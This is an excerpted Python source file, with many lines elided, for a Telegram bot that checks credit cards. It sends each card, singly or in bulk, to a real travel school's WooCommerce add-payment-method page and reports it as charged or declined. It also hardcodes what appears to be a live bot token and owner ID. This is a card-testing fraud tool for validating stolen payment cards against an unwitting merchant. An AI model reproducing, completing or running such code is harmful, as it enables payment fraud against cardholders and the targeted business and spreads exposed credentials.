...
# Bot configuration
TELEGRAM_TOKEN = "7348550676:AAFpydBYLp8p4MOdFRfjxby44sM2uCfzN4A"
OWNER_ID = 5696226098
...
def build_inline_keyboard(current_card, charged_1, declined, ccn, total):
    ...
    # Pass the list of button rows to InlineKeyboardMarkup
...
async def check_credit_card(update: Update, context: ContextTypes.DEFAULT_TYPE, card, session, user_id, is_mass_check):
    ...
    try:
        ...
        response = session.get('https://www.thetravelinstitute.com/my-account/add-payment-method/', headers=headers, timeout=10)
        ...
        if 'error' in res:
            ...
            if any(code_phrase in error.lower() for code_phrase in ['code', 'cvc', 'security code']):
                ...
                stats['declined'] += 1
            if not is_mass_check:  # Send declined message for /chk
                await update.message.reply_text(f"> 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n> {card} - Declined: {error}")
        ...
        response = session.post('https://www.thetravelinstitute.com/', params=params, headers=headers, data=data, timeout=10)
        res = response.json()
